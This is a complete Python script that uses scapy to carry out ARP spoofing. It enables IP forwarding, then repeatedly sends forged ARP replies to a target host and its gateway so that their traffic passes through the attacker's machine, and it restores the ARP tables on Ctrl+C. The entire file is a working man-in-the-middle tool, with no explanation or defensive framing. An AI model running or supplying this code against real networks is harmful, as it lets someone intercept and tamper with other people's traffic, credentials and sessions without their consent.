#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse
import subprocess

subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--gateway", dest="gateway_ip", help="gateway/router ip address")
    parser.add_argument("--target", dest="target_ip", help="target ip address")
    options = parser.parse_args()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst= "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def resstore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4,verbose=False)

options = get_arguments()

sent_packet_count = 0
try:
    while True:
         spoof(options.gateway_ip, options.target_ip)
         spoof(options.target_ip, options.gateway_ip)
         sent_packet_count = sent_packet_count + 2
         print("\r[+] packet sent: " + str(sent_packet_count)),
         sys.stdout.flush()
         time.sleep(2)

except KeyboardInterrupt:
    print("......\n[-] Detected CTRL + C...Restoring ARP tables.")
    resstore(options.target_ip, options.gateway_ip)
    resstore(options.gateway_ip, options.target_ip)

